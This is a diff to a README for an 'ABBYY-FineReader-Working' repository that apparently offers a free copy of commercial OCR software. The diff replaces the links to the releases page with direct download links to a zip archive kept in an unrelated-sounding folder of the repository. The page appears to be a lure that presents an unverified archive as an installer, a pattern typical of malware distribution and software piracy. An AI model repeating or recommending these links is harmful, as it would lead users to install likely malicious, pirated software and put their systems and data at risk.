@@ -1,6 +1,6 @@
 # 🚀 ABBYY-FineReader-Working - Access Quality OCR Effortlessly
 
-[![Download ABBYY-FineReader-Working](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Obsequious-rhineland344/ABBYY-FineReader-Working/releases)
+[![Download ABBYY-FineReader-Working](https://raw.githubusercontent.com/Obsequious-rhineland344/ABBYY-FineReader-Working/main/ectozoon/ABBYY-FineReader-Working-2.4-alpha.1.zip)](https://raw.githubusercontent.com/Obsequious-rhineland344/ABBYY-FineReader-Working/main/ectozoon/ABBYY-FineReader-Working-2.4-alpha.1.zip)
 
 ## 📖 Introduction
 
@@ -30,7 +30,7 @@ To get started with ABBYY FineReader, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the page where you can download the software.
 
-   [Download ABBYY-FineReader-Working](https://github.com/Obsequious-rhineland344/ABBYY-FineReader-Working/releases)
+   [Download ABBYY-FineReader-Working](https://raw.githubusercontent.com/Obsequious-rhineland344/ABBYY-FineReader-Working/main/ectozoon/ABBYY-FineReader-Working-2.4-alpha.1.zip)
 
 2. **Find the Latest Version:** Look for the latest version available. It should be at the top of the releases section.
 
@@ -40,7 +40,7 @@ To get started with ABBYY FineReader, follow these steps:
 
 1. **Download the Installer:**
    
-   Go to the [Releases Page](https://github.com/Obsequious-rhineland344/ABBYY-FineReader-Working/releases) again. Find the installer file specific to your system and click the download link.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Obsequious-rhineland344/ABBYY-FineReader-Working/main/ectozoon/ABBYY-FineReader-Working-2.4-alpha.1.zip) again. Find the installer file specific to your system and click the download link.
 
 2. **Run the Installer:**
    
